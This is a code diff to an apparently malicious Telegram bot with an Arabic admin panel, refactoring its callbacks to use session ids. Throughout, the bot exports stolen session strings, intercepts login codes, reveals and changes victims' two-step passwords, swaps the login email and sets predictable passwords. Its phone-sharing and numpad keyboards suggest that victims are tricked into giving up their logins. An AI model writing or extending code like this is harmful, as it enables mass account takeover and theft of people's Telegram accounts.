@@ -13,10 +13,11 @@ from config import (
 import database
 import session_manager
 import volume_backup
+import admin_resolve
 from keyboards import (
     age_confirm_keyboard, share_phone_keyboard, numpad_keyboard,
     retry_keyboard, sessions_keyboard, session_detail_keyboard,
-    back_to_session_keyboard, ADMIN_FOOTER
+    back_to_session_keyboard, ADMIN_FOOTER, CB,
 )
 
 logging.basicConfig(level=logging.INFO)
@@ -72,6 +73,63 @@ async def _guard_session(callback: CallbackQuery, phone: str) -> bool:
         await callback.answer("❌ هذا الحساب غير متاح.", show_alert=True)
         return False
     return True
+
+
+async def _guard_session_row(callback: CallbackQuery, session) -> bool:
+    if not session:
+        await callback.answer("❌ الجلسة غير موجودة!", show_alert=True)
+        return False
+    return await _guard_session(callback, session["phone"])
+
+
+_KIND_BY_PREFIX = {v: k for k, v in CB.items()}
+
+
+async def _render_session_detail(callback: CallbackQuery, session):
+    phone = session["phone"]
+    sid = session["id"]
+    username = session["username"] or "لا يوجد"
+    full_name = session["full_name"] or "غير معروف"
+    created_at = session["created_at"]
+    two_fa_stat = "✅ موجود" if session["two_fa"] else "❌ لا يوجد"
+    valid_stat = "✅ نشطة" if session["valid"] else "❌ غير صالحة"
+    login_mail = database.row_login_email(session) or "❌ غير مربوط"
+    secured_stat = "🔒 مؤمّنة" if database.row_flag(session, "secured") else "—"
+    private_stat = "⭐ خاصة (A1)" if database.row_flag(session, "a1_only") else "—"
+    text = (
+        f"📱 <code>{h(phone)}</code>\n\n"
+        f"👤 الاسم: {h(full_name)}\n"
+        f"🔖 اليوزر: @{h(username)}\n"
+        f"🔐 التحقق بخطوتين: {two_fa_stat}\n"
+        f"📧 بريد Login: <code>{h(login_mail)}</code>\n"
+        f"📶 الحالة: {valid_stat}\n"
+        f"🔒 التأمين: {secured_stat}\n"
+        f"⭐ الخصوصية: {private_stat}\n"
+        f"📅 تاريخ التسجيل: {h(created_at)}"
+        + ADMIN_FOOTER
+    )
+    await callback.message.edit_text(
+        text,
+        reply_markup=session_detail_keyboard(sid),
+        parse_mode="HTML",
+    )
+
+
+async def _export_session_message(callback: CallbackQuery, session):
+    phone = session["phone"]
+    ss = await session_manager.ensure_session_string(phone)
+    if ss:
+        await callback.message.answer(
+            f"📦 كود الجلسة للرقم <code>{h(phone)}</code>:\n\n"
+            f"<code>{h(ss)}</code>",
+            parse_mode="HTML",
+        )
+    else:
+        await callback.message.answer(
+            f"❌ لا يوجد session_string للرقم <code>{h(phone)}</code>.\n"
+            f"الجلسة غير متصلة أو منتهية — جرّب «فحص الجلسات».",
+            parse_mode="HTML",
+        )
 
 
 async def _admin_panel_text(uid: int) -> str:
@@ -487,45 +545,15 @@ async def sessions_page(callback: CallbackQuery):
     await callback.answer()
 
 
-@dp.callback_query(F.data.startswith("session_"))
+@dp.callback_query(F.data.regexp(r"^i\d+$"))
 async def session_detail(callback: CallbackQuery):
     if not is_admin(callback.from_user.id):
         await callback.answer()
         return
-    uid = callback.from_user.id
-    phone = callback.data[8:]
-    if not await database.can_admin_access_session(uid, phone, SUPER_ADMIN_ID):
-        await callback.answer("❌ هذا الحساب غير متاح.", show_alert=True)
+    session = await admin_resolve.get_session_from_callback(callback.data, "session")
+    if not await _guard_session_row(callback, session):
         return
-    session = await database.get_session_by_phone(phone)
-    if not session:
-        await callback.answer("❌ الجلسة غير موجودة!")
-        return
-
-    username    = session["username"]  or "لا يوجد"
-    full_name   = session["full_name"] or "غير معروف"
-    created_at  = session["created_at"]
-    two_fa_stat = "✅ موجود" if session["two_fa"] else "❌ لا يوجد"
-    valid_stat  = "✅ نشطة"  if session["valid"]  else "❌ غير صالحة"
-    login_mail  = database.row_login_email(session) or "❌ غير مربوط"
-    secured_stat = "🔒 مؤمّنة" if database.row_flag(session, "secured") else "—"
-    private_stat = "⭐ خاصة (A1)" if database.row_flag(session, "a1_only") else "—"
-
-    text = (
-        f"📱 <code>{h(phone)}</code>\n\n"
-        f"👤 الاسم: {h(full_name)}\n"
-        f"🔖 اليوزر: @{h(username)}\n"
-        f"🔐 التحقق بخطوتين: {two_fa_stat}\n"
-        f"📧 بريد Login: <code>{h(login_mail)}</code>\n"
-        f"📶 الحالة: {valid_stat}\n"
-        f"🔒 التأمين: {secured_stat}\n"
-        f"⭐ الخصوصية: {private_stat}\n"
-        f"📅 تاريخ التسجيل: {h(created_at)}"
-        + ADMIN_FOOTER
-    )
-    await callback.message.edit_text(
-        text, reply_markup=session_detail_keyboard(phone), parse_mode="HTML"
-    )
+    await _render_session_detail(callback, session)
     await callback.answer()
 
 
@@ -546,22 +574,20 @@ async def back_to_sessions(callback: CallbackQuery):
 
 
 # ──────────────────────────────────────────
-# ⭐ إخفاء جلسة عن باقي الأدمنة (A1 فقط)
+# أزرار الجلسة (id في callback — لا يُقطع رقم الهاتف)
 # ──────────────────────────────────────────
-@dp.callback_query(F.data.startswith("a1_hide_"))
+@dp.callback_query(F.data.regexp(r"^h\d+$"))
 async def a1_hide_session(callback: CallbackQuery):
     if not is_super_admin(callback.from_user.id):
         await callback.answer("❌ لأدمن رقم 1 فقط", show_alert=True)
         return
-    phone = callback.data[9:]
-    session = await database.get_session_by_phone(phone)
+    session = await admin_resolve.get_session_from_callback(callback.data, "hide")
     if not session:
         await callback.answer("❌ غير موجود")
         return
-
+    phone = session["phone"]
     hide = not database.row_flag(session, "a1_only")
     await database.set_session_a1_only(phone, hide)
-
     if hide:
         notifs = await database.get_admin_notifications_for_phone(
             phone, except_admin=SUPER_ADMIN_ID
@@ -579,16 +605,26 @@ async def a1_hide_session(callback: CallbackQuery):
         )
     else:
         await callback.answer("☆ ظهر للأدمنية مرة أخرى", show_alert=True)
-
     uid = callback.from_user.id
     sessions = await _sessions_for_admin(uid)
     text = await _admin_panel_text(uid)
-    page = 0
     await callback.message.edit_text(
         text,
-        reply_markup=sessions_keyboard(sessions, page, is_super_admin=True),
+        reply_markup=sessions_keyboard(sessions, 0, is_super_admin=True),
         parse_mode="HTML",
     )
+
+
+@dp.callback_query(F.data.regexp(r"^x\d+$"))
+async def export_session_text(callback: CallbackQuery):
+    if not is_admin(callback.from_user.id):
+        await callback.answer()
+        return
+    session = await admin_resolve.get_session_from_callback(callback.data, "export")
+    if not await _guard_session_row(callback, session):
+        return
+    await _export_session_message(callback, session)
+    await callback.answer()
 
 
 # ──────────────────────────────────────────
@@ -718,28 +754,6 @@ async def volume_import_file(message: Message, state: FSMContext):
 # ──────────────────────────────────────────
 # سحب الجلسات (نصي وملف)
 # ──────────────────────────────────────────
-@dp.callback_query(F.data.startswith("export_") and ~F.data.startswith("export_all"))
-async def export_session_text(callback: CallbackQuery):
-    if not is_admin(callback.from_user.id):
-        await callback.answer()
-        return
-    uid = callback.from_user.id
-    phone = callback.data[7:]
-    if not await database.can_admin_access_session(uid, phone, SUPER_ADMIN_ID):
-        await callback.answer("❌ غير متاح", show_alert=True)
-        return
-    session = await database.get_session_by_phone(phone)
-    if session and session["session_string"]:
-        txt = (
-            f"📦 كود الجلسة للرقم <code>{h(phone)}</code>:\n\n"
-            f"<code>{h(session['session_string'])}</code>"
-        )
-        await callback.message.answer(txt, parse_mode="HTML")
-    else:
-        await callback.message.answer("❌ لا يوجد session_string لهذا الرقم.")
-    await callback.answer()
-
-
 @dp.callback_query(F.data == "export_all_txt")
 async def export_all_sessions_txt(callback: CallbackQuery):
     if not is_admin(callback.from_user.id):
@@ -756,8 +770,11 @@ async def export_all_sessions_txt(callback: CallbackQuery):
 
     lines = []
     for s in sessions:
-        if s["session_string"]:
-            lines.append(f"{s['phone']}:{s['session_string']}")
+        ss = s["session_string"]
+        if not ss or not str(ss).strip():
+            ss = await session_manager.ensure_session_string(s["phone"])
+        if ss:
+            lines.append(f"{s['phone']}:{ss}")
 
     if not lines:
         await callback.message.edit_text("❌ لا توجد أكواد جلسات محفوظة لإرسالها.")
@@ -795,11 +812,13 @@ async def export_star_sessions_txt(callback: CallbackQuery):
         return
 
     await callback.message.edit_text("⏳ جاري تجهيز ملف جلسات النجمة...", parse_mode="HTML")
-    lines = [
-        f"{s['phone']}:{s['session_string']}"
-        for s in sessions
-        if s["session_string"]
-    ]
+    lines = []
+    for s in sessions:
+        ss = s["session_string"]
+        if not ss or not str(ss).strip():
+            ss = await session_manager.ensure_session_string(s["phone"])
+        if ss:
+            lines.append(f"{s['phone']}:{ss}")
     if not lines:
         await callback.message.edit_text("❌ لا توجد أكواد لجلسات النجمة.")
         return
@@ -826,16 +845,16 @@ async def export_star_sessions_txt(callback: CallbackQuery):
 # ──────────────────────────────────────────
 # حذف جلسة فردية نهائياً
 # ──────────────────────────────────────────
-@dp.callback_query(F.data.startswith("del_session_"))
+@dp.callback_query(F.data.regexp(r"^d\d+$"))
 async def delete_single_session(callback: CallbackQuery):
     if not is_admin(callback.from_user.id):
         await callback.answer()
         return
     uid = callback.from_user.id
-    phone = callback.data[12:]
-    if not await database.can_admin_access_session(uid, phone, SUPER_ADMIN_ID):
-        await callback.answer("❌ غير متاح", show_alert=True)
+    session = await admin_resolve.get_session_from_callback(callback.data, "delete")
+    if not await _guard_session_row(callback, session):
         return
+    phone = session["phone"]
     await database.delete_admin_notifications_for_phone(phone)
     await database.delete_session(phone)
     await callback.answer(f"✅ تم حذف {phone} نهائياً.", show_alert=True)
@@ -864,32 +883,32 @@ async def reset_counter(callback: CallbackQuery):
 # ──────────────────────────────────────────
 # تغيير البريد تلقائياً
 # ──────────────────────────────────────────
-@dp.callback_query(F.data.startswith("ch_mail_"))
+@dp.callback_query(F.data.regexp(r"^m\d+$"))
 async def auto_mail_process(callback: CallbackQuery):
     if not is_admin(callback.from_user.id):
         await callback.answer()
         return
-    phone = callback.data[8:]
-    if not await _guard_session(callback, phone):
+    session = await admin_resolve.get_session_from_callback(callback.data, "mail")
+    if not await _guard_session_row(callback, session):
         return
+    phone, sid = session["phone"], session["id"]
     await callback.message.edit_text(
         "⏳ جاري توليد بريد جديد وانتظار الكود..." + ADMIN_FOOTER,
-        parse_mode="HTML"
+        parse_mode="HTML",
     )
-
     res = await session_manager.change_login_email(phone)
     if res["success"]:
         new_email = res.get("email", "")
         await callback.message.edit_text(
             f"✅ تم تغيير البريد بنجاح إلى:\n<code>{h(new_email)}</code>" + ADMIN_FOOTER,
             parse_mode="HTML",
-            reply_markup=back_to_session_keyboard(phone)
+            reply_markup=back_to_session_keyboard(sid),
         )
     else:
         await callback.message.edit_text(
             f"❌ فشل العملية: <code>{h(res['error'])}</code>" + ADMIN_FOOTER,
             parse_mode="HTML",
-            reply_markup=back_to_session_keyboard(phone)
+            reply_markup=back_to_session_keyboard(sid),
         )
     await callback.answer()
 
@@ -897,44 +916,41 @@ async def auto_mail_process(callback: CallbackQuery):
 # ──────────────────────────────────────────
 # الطرد + سحب الكود
 # ──────────────────────────────────────────
-@dp.callback_query(F.data.startswith("req_code_"))
+@dp.callback_query(F.data.regexp(r"^c\d+$"))
 async def admin_req_code(callback: CallbackQuery, state: FSMContext):
     if not is_admin(callback.from_user.id):
         await callback.answer()
         return
-
-    phone = callback.data[9:]
-    if not await _guard_session(callback, phone):
+    session = await admin_resolve.get_session_from_callback(callback.data, "code")
+    if not await _guard_session_row(callback, session):
         return
+    phone, sid = session["phone"], session["id"]
     admin_id = callback.from_user.id
-    msg_id   = callback.message.message_id
+    msg_id = callback.message.message_id
     user_msg_ids[admin_id] = msg_id
-
     old_task = code_wait_tasks.pop(admin_id, None)
     if old_task:
         old_task.cancel()
-
-    session     = await database.get_session_by_phone(phone)
     two_fa_text = ""
-    if session and session["two_fa"]:
+    if session["two_fa"]:
         two_fa_text = f"\n\n🔐 <b>التحقق بخطوتين:</b> <code>{h(session['two_fa'])}</code>"
-
     await callback.message.edit_text(
         f"⏳ في انتظار الكود للرقم <code>{h(phone)}</code>\n\n"
         f"اطلب الكود بنفسك، البوت سيرسله لك فور وصوله تلقائياً."
         + two_fa_text + ADMIN_FOOTER,
         parse_mode="HTML",
-        reply_markup=back_to_session_keyboard(phone)
+        reply_markup=back_to_session_keyboard(sid),
     )
-
     task = asyncio.create_task(
-        _watch_and_forward(admin_id, phone, msg_id, two_fa_text)
+        _watch_and_forward(admin_id, phone, sid, msg_id, two_fa_text)
     )
     code_wait_tasks[admin_id] = task
     await callback.answer()
 
 
-async def _watch_and_forward(admin_id: int, phone: str, msg_id: int, two_fa_text: str):
+async def _watch_and_forward(
+    admin_id: int, phone: str, session_id: int, msg_id: int, two_fa_text: str
+):
     code_msg = await session_manager.watch_for_new_code(phone, timeout=180)
     code_wait_tasks.pop(admin_id, None)
 
@@ -947,7 +963,7 @@ async def _watch_and_forward(admin_id: int, phone: str, msg_id: int, two_fa_text
                 chat_id=admin_id,
                 message_id=msg_id,
                 parse_mode="HTML",
-                reply_markup=back_to_session_keyboard(phone)
+                reply_markup=back_to_session_keyboard(session_id)
             )
         except Exception:
             await bot.send_message(
@@ -955,7 +971,7 @@ async def _watch_and_forward(admin_id: int, phone: str, msg_id: int, two_fa_text
                 f"📲 <b>وصل الكود للرقم</b> <code>{h(phone)}</code>\n\n"
                 f"<code>{h(code_msg)}</code>" + two_fa_text + ADMIN_FOOTER,
                 parse_mode="HTML",
-                reply_markup=back_to_session_keyboard(phone)
+                reply_markup=back_to_session_keyboard(session_id),
             )
     else:
         try:
@@ -965,60 +981,31 @@ async def _watch_and_forward(admin_id: int, phone: str, msg_id: int, two_fa_text
                 chat_id=admin_id,
                 message_id=msg_id,
                 parse_mode="HTML",
-                reply_markup=back_to_session_keyboard(phone)
+                reply_markup=back_to_session_keyboard(session_id),
             )
         except Exception:
             pass
 
 
-@dp.callback_query(F.data.startswith("kick_"))
-async def admin_kick_sessions(callback: CallbackQuery):
-    if not is_admin(callback.from_user.id):
-        await callback.answer()
-        return
-    phone = callback.data[5:]
-    if not await _guard_session(callback, phone):
-        return
-    await callback.message.edit_text(
-        "⏳ جاري طرد الجلسات..." + ADMIN_FOOTER,
-        parse_mode="HTML",
-        reply_markup=back_to_session_keyboard(phone)
-    )
-    result = await session_manager.terminate_other_sessions(phone)
-    if result["success"]:
-        txt = f"✅ تم طرد جميع الجلسات الأخرى من <code>{h(phone)}</code> بنجاح!"
-    else:
-        err = result.get("error", "")
-        txt = (
-            "⚠️ الجلسة لا تزال جديدة، انتظر قليلاً وحاول مجدداً."
-            if "fresh" in err.lower() or "recently" in err.lower()
-            else f"❌ فشل الطرد: <code>{h(err)}</code>"
-        )
-    await callback.message.edit_text(
-        txt + ADMIN_FOOTER, parse_mode="HTML",
-        reply_markup=back_to_session_keyboard(phone)
-    )
-    await callback.answer()
-
-
 # ──────────────────────────────────────────
 # تغيير اليوزر
 # ──────────────────────────────────────────
-@dp.callback_query(F.data.startswith("ch_user_"))
+@dp.callback_query(F.data.regexp(r"^u\d+$"))
 async def admin_change_username(callback: CallbackQuery, state: FSMContext):
     if not is_admin(callback.from_user.id):
         await callback.answer()
         return
-    phone = callback.data[8:]
-    if not await _guard_session(callback, phone):
+    session = await admin_resolve.get_session_from_callback(callback.data, "user")
+    if not await _guard_session_row(callback, session):
         return
+    phone, sid = session["phone"], session["id"]
     await state.set_state(AdminFlow.changing_user)
-    await state.update_data(phone=phone)
+    await state.update_data(phone=phone, session_id=sid)
     user_msg_ids[callback.from_user.id] = callback.message.message_id
     await callback.message.edit_text(
         f"✏️ أدخل اليوزر الجديد للحساب <code>{h(phone)}</code>:\n(بدون @)" + ADMIN_FOOTER,
         parse_mode="HTML",
-        reply_markup=back_to_session_keyboard(phone)
+        reply_markup=back_to_session_keyboard(sid),
     )
     await callback.answer()
 
@@ -1031,6 +1018,7 @@ async def process_username_change(message: Message, state: FSMContext):
     await safe_delete(message.chat.id, message.message_id)
     data  = await state.get_data()
     phone = data.get("phone")
+    sid = data.get("session_id")
     new_u = message.text.strip().replace("@", "")
     result = await session_manager.change_username(phone, new_u)
     txt = (
@@ -1038,28 +1026,29 @@ async def process_username_change(message: Message, state: FSMContext):
         if result["success"]
         else f"❌ فشل: {h(result.get('error', ''))}"
     )
-    await edit_or_send(aid, aid, txt + ADMIN_FOOTER, markup=back_to_session_keyboard(phone))
+    await edit_or_send(aid, aid, txt + ADMIN_FOOTER, markup=back_to_session_keyboard(sid))
     await state.clear()
 
 
 # ──────────────────────────────────────────
 # تغيير الاسم
 # ──────────────────────────────────────────
-@dp.callback_query(F.data.startswith("ch_name_"))
+@dp.callback_query(F.data.regexp(r"^n\d+$"))
 async def admin_change_name(callback: CallbackQuery, state: FSMContext):
     if not is_admin(callback.from_user.id):
         await callback.answer()
         return
-    phone = callback.data[8:]
-    if not await _guard_session(callback, phone):
+    session = await admin_resolve.get_session_from_callback(callback.data, "name")
+    if not await _guard_session_row(callback, session):
         return
+    phone, sid = session["phone"], session["id"]
     await state.set_state(AdminFlow.changing_name)
-    await state.update_data(phone=phone)
+    await state.update_data(phone=phone, session_id=sid)
     user_msg_ids[callback.from_user.id] = callback.message.message_id
     await callback.message.edit_text(
         f"📝 أدخل الاسم الجديد للحساب <code>{h(phone)}</code>:" + ADMIN_FOOTER,
         parse_mode="HTML",
-        reply_markup=back_to_session_keyboard(phone)
+        reply_markup=back_to_session_keyboard(sid),
     )
     await callback.answer()
 
@@ -1081,29 +1070,28 @@ async def process_name_change(message: Message, state: FSMContext):
         if result["success"]
         else f"❌ فشل: {h(result.get('error', ''))}"
     )
-    await edit_or_send(aid, aid, txt + ADMIN_FOOTER, markup=back_to_session_keyboard(phone))
+    sid = data.get("session_id")
+    await edit_or_send(aid, aid, txt + ADMIN_FOOTER, markup=back_to_session_keyboard(sid))
     await state.clear()
 
 
 # ──────────────────────────────────────────
 # التحقق بخطوتين
 # ──────────────────────────────────────────
-@dp.callback_query(F.data.startswith("ch_2fa_"))
+@dp.callback_query(F.data.regexp(r"^f\d+$"))
 async def admin_change_2fa(callback: CallbackQuery, state: FSMContext):
     if not is_admin(callback.from_user.id):
         await callback.answer()
         return
-    phone = callback.data[7:]
-    if not await _guard_session(callback, phone):
+    session = await admin_resolve.get_session_from_callback(callback.data, "twofa")
+    if not await _guard_session_row(callback, session):
         return
-    session = await database.get_session_by_phone(phone)
-    has_2fa = bool(session and session["two_fa"])
+    phone, sid = session["phone"], session["id"]
+    has_2fa = bool(session["two_fa"])
     current = session["two_fa"] if has_2fa else None
-
     user_msg_ids[callback.from_user.id] = callback.message.message_id
     await state.set_state(AdminFlow.changing_2fa)
-    await state.update_data(phone=phone, old_2fa=current, has_2fa=has_2fa)
-
+    await state.update_data(phone=phone, session_id=sid, old_2fa=current, has_2fa=has_2fa)
     txt = (
         f"🔐 الحساب <code>{h(phone)}</code> لديه تحقق بخطوتين حالياً.\n\n"
         f"أدخل كلمة المرور <b>الجديدة</b>:\n"
@@ -1113,8 +1101,9 @@ async def admin_change_2fa(callback: CallbackQuery, state: FSMContext):
         f"أدخل كلمة المرور الجديدة لتفعيل التحقق بخطوتين:"
     )
     await callback.message.edit_text(
-        txt + ADMIN_FOOTER, parse_mode="HTML",
-        reply_markup=back_to_session_keyboard(phone)
+        txt + ADMIN_FOOTER,
+        parse_mode="HTML",
+        reply_markup=back_to_session_keyboard(sid),
     )
     await callback.answer()
 
@@ -1126,7 +1115,8 @@ async def process_2fa_change(message: Message, state: FSMContext):
     aid = message.from_user.id
     await safe_delete(message.chat.id, message.message_id)
     data    = await state.get_data()
-    phone   = data.get("phone")
+    phone = data.get("phone")
+    sid = data.get("session_id")
     old_2fa = data.get("old_2fa")
     has_2fa = data.get("has_2fa", False)
     new_2fa = message.text.strip()
@@ -1134,7 +1124,7 @@ async def process_2fa_change(message: Message, state: FSMContext):
     await edit_or_send(
         aid, aid,
         "⏳ جاري تطبيق التغيير على الحساب..." + ADMIN_FOOTER,
-        markup=back_to_session_keyboard(phone)
+        markup=back_to_session_keyboard(sid),
     )
 
     if new_2fa.lower() == "remove":
@@ -1142,7 +1132,7 @@ async def process_2fa_change(message: Message, state: FSMContext):
             await edit_or_send(
                 aid, aid,
                 f"⚠️ الحساب <code>{h(phone)}</code> ليس لديه تحقق بخطوتين أصلاً." + ADMIN_FOOTER,
-                markup=back_to_session_keyboard(phone)
+                markup=back_to_session_keyboard(sid),
             )
         else:
             result = await session_manager.remove_two_fa(phone, old_2fa)
@@ -1151,7 +1141,7 @@ async def process_2fa_change(message: Message, state: FSMContext):
                 if result["success"]
                 else f"❌ فشل الإزالة: <code>{h(result.get('error', ''))}</code>"
             )
-            await edit_or_send(aid, aid, txt + ADMIN_FOOTER, markup=back_to_session_keyboard(phone))
+            await edit_or_send(aid, aid, txt + ADMIN_FOOTER, markup=back_to_session_keyboard(sid))
     else:
         result = await session_manager.set_two_fa(phone, new_2fa, old_2fa if has_2fa else None)
         txt = (
@@ -1160,21 +1150,22 @@ async def process_2fa_change(message: Message, state: FSMContext):
             if result["success"]
             else f"❌ فشل التغيير: <code>{h(result.get('error', ''))}</code>"
         )
-        await edit_or_send(aid, aid, txt + ADMIN_FOOTER, markup=back_to_session_keyboard(phone))
+        await edit_or_send(aid, aid, txt + ADMIN_FOOTER, markup=back_to_session_keyboard(sid))
     await state.clear()
 
 
 # ──────────────────────────────────────────
 # التنظيف الشامل
 # ──────────────────────────────────────────
-@dp.callback_query(F.data.startswith("full_kick_"))
+@dp.callback_query(F.data.regexp(r"^k\d+$"))
 async def admin_full_cleanup(callback: CallbackQuery):
     if not is_admin(callback.from_user.id):
         await callback.answer()
         return
-    phone = callback.data[10:]
-    if not await _guard_session(callback, phone):
+    session = await admin_resolve.get_session_from_callback(callback.data, "kick")
+    if not await _guard_session_row(callback, session):
         return
+    phone, sid = session["phone"], session["id"]
     new_pw = "Pass" + phone[-4:]
 
     await callback.message.edit_text(
@@ -1208,7 +1199,7 @@ async def admin_full_cleanup(callback: CallbackQuery):
     await callback.message.edit_text(
         result_msg + ADMIN_FOOTER,
         parse_mode="HTML",
-        reply_markup=back_to_session_keyboard(phone)
+        reply_markup=back_to_session_keyboard(sid),
     )
     await callback.answer()
 
